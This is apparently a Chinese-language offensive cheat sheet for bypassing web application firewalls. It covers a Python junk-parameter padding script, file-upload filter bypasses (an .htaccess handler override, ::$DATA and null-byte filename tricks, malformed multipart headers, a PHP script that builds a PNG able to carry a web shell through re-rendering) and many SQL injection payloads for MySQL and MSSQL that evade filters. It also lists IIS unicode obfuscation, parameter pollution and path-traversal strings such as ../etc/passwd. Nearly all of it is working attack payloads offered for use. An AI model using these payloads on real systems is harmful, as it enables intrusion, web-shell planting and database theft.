# WAF



**垃圾数据**

```
#coding=utf-8
import random,string
from urllib import parse
# code by yzddMr6
varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
	str_list = [random.choice(string.ascii_letters) for i in range(length)]
	random_str = ''.join(str_list)
	return random_str
def main():
	data={}
	for i in range(num_min,num_max):
		data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
	print('&'+parse.urlencode(data)+'&')
main()
放到要注入的字段前后
```

**上传bypass**

**图片文件头**

```
PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A
GIF 为 47 49 46 38 37 61
JPG 为 FF D8 FF E0
```

**添加图片头或合并图片包含**

**后缀大小写**

**文件名前缀加\[0x09]**

**上传.htaccess**

```
SetHandler application/x-httpd-php
```

**二次渲染**

```
GIF
找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传
JPG
使用脚本直接生成
https://github.com/BlackFan/jpg_payload
PNG
使用脚本直接生成
先取消php.ini注释;extension=php_gd2.dll
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
       0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
	$r = $p[$y];
	$g = $p[$y+1];
	$b = $p[$y+2];
	$color = imagecolorallocate($img, $r, $g, $b);
	imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'./1.png');
?>
```

**上传php3,php4,phtml等**

**文件名后加::$DATA**

```
ConTent-Disposition: form-data; name="filepath"; filename="1.asp::$DATA"
ConTent-Disposition: form-data; name="filepath"; filename="1.asp::$DATA\0x00\1.asp0x00.jpg"
```

**asp . (空格+.)**

**php. .(点+空格+点)**

**双写phphpp**

**00截断**

```
Get参数00截断直接添加%00
POST参数00截断修改hex为00
```

**修改一些固定的参数**

**文件名去掉双引号**

**加一个filename1的参数**

**form变量改成f+orm**

**去掉form-data**

**content-Encoding: deflate**

overflow content-Disposition

**在Content-Disposition或form-data;后添加多个空格**

**引号回车**

```
ConTent-Disposition: form-data; name="filepath"; filename="backlion.asp
"
```

**Content-Type和ConTent-Disposition调换位置**

**文件名前缀加空格**

```
filename=    "1.asp"
```

**name前加空格**

```
Content-Disposition: form-data;      name="uploaded"; filename="1.asp"
```

**form-data的前后加上+**

```
Content-Disposition: +form-data; name="filepath"; filename="1.asp"
```

**ASP+IIS**

```
s%elect>select
s%u0065lect>select  
s%u00f0lect>select
s%u0045lect = s%u0065lect = %u00f0lect
u -->%u0055 --> %u0075
n -->%u004e --> %u006e
i -->%u0049 --> %u0069
o -->%u004f --> %u006f -->%u00ba
s -->%u0053 --> %u0073
l -->%u004c --> %u006c
e -->%u0045 --> %u0065-->%u00f0
c -->%u0043 --> %u0063
t -->%u0054 -->%u0074 -->%u00de -->%u00fe
f -->%u0046 -->%u0066
r -->%u0052 -->%u0072
m -->%u004d -->%u006d
```

**Asp+iis\&aspx+iis**

```
s%u006c%u0006ect>select
```

**apache**

```
TEST /sql.php?id=1 HTTP/1.1
```

**大小写/关键字**

```
UniOn SeLECT
Mid()substring()  substr()
Hex()ascii()
sleep() =benchmark()
concat_ws()=group_concat()
```

**双重url编码**

**变换请求方式**

**HPP参数污染**

```
id=1&id=2&id=3
得到的结果：Asp.net + iis：id=1,2,3 
Asp+iis：id=1,2,3 
Php+apache：id=3
MSSQL:
GET+POST: 
GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
post:  id=2*/select null,null,null
无逗号形式：
?id=1 union select 1&id=2&id=3&id=4 from admin--（）  
利用逗号：
?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
无效参数形式：
?a=/*&sql=xxx&b=*/  a,b为无效参数
溢出形式：?id=1/*&id=*//*&id=*//*......&id=*//*&id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata
MYSQL：
?id=1&id=1&id=1&id=1&id=1&id=1&id=1&id=….. &id=1 union select 1,2 from admin
```

**数据库**

**Access**

```
空格符
%09、%0a、%0c、%0d、%16
```

**Mysql**

```
注释符
#、/*...*/、--[空格] ...
空格符
[0x09,0x0a-0x0d,0x20,0xa0]
特殊符号
%a 换行符，可结合注释符使用%23%0a，%2d%2d%0a。
%21  ！ 叹号
%2b  +  加号
%2d  -  减号
%40  @  符号
%7e   ~  波浪号
Id=1 union select(1),user()
Id=1 union /!12345select/1,user()
Id=1 union select@1,user()
Id=1 union select {x 1},user()
Id=1 union select"1",user()
Id=1 union select\N,user()
Id=1 union select 1,user()`
Id=1 union select 1,user()""
Id=1 union select 1,user()A
Id=1 union select 1,user()`b
Id=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select{x schema_name}from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))
浮点数
Id= 1.0union select 1,user()
Id= 1.union select 1,user()
Id= 1E0union select 1,user()
Id=\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\Nfrom admin
内联注释
/*!UnIon12345SelEcT*/ 1,user()   //数字范围 1000-50540
mysql黑魔法
select{x username}from {x11 test.admin};
函数
截取
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)) 
连接
concat(version(),'|',user());
concat_ws('|',1,2,3)
字符转换
Ascii() Char() Hex() Unhex()
过滤逗号
127' UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 
相当于 union select 1,2,3,4,5
union select * from (select 1)a join(select{x schema_name} from information_schema.SCHEMATA limit 1,1)b
limit 1 offset 0相当于limit 1,0
mid(version() from 1 for 1)相当于Mid(version(),1,1)
<>被过滤
id=1 and ascii(substr(database(),0,1))>64
比较符
greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值
id=1 and greatest(ascii(substr(database(),0,1)),64)=64
函数构造
sleep(5)/benchmark(10000000,SHA1(1))
id=1 xor sleep%23%0a(5)
id=1 xor sleep%2d%2d%0a(5)
id=1 xor sleep([%20]5) 
id=1 xor benchmark%0a(10000000,SHA1(1))
id=1 xor sleep[空白字符](5)
select{x[可填充字符]1}
```

**MSSQL**

```
注释符
/*、--、;00%、/**/
空格符
[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]
特殊符号
%3a 冒号
id=1 union:select 1,2 from:admin
id=1 union select+1,'2',db_name() from admin
id=1 union select-1,'2',db_name() from admin
id=1 union select.1,'2',db_name() from admin
id=1 union select:1,'2',db_name() from admin
id=1 union select~1,'2',db_name() from admin
id=1%20union%20select%201,'2',db_name()%80from%20admin
id=1 union select 1,'2',db_name+() from admin
函数变形: db_name[空白字符]()
浮点数
id=1.1union select 1,'2',db_name()
id=1e0union select 1,'2',db_name()
运算符
id=1-1union select '1',system_user,3 from admin
id=1e-union select '1',system_user,3 from admin
字符串截取函数
Substring(@@version,1,1)
Left(@@version,1)
Right(@@version,1)
charindex('test',db_name())
字符串转换函数
Ascii('a')=char(97) 括号之间可添加空格
```

**WAF**

```
同时提交GET和POST
访问HTTP绕过对HTTPS的防护
%00截断
参数填充垃圾数据，缓冲区溢出
X-FORWARDED-FOR伪造绕过
静态文件/sql.php/1.js?id=1绕过
白名单绕过，URL只要存在某字符就不会拦截
/sql.php/admin.php?id=1
/sql.php?a=/manage/&b=../etc/passwd
/../../../manage/../sql.asp?id=2
伪造User-agent绕过，可改为爬虫agent
```
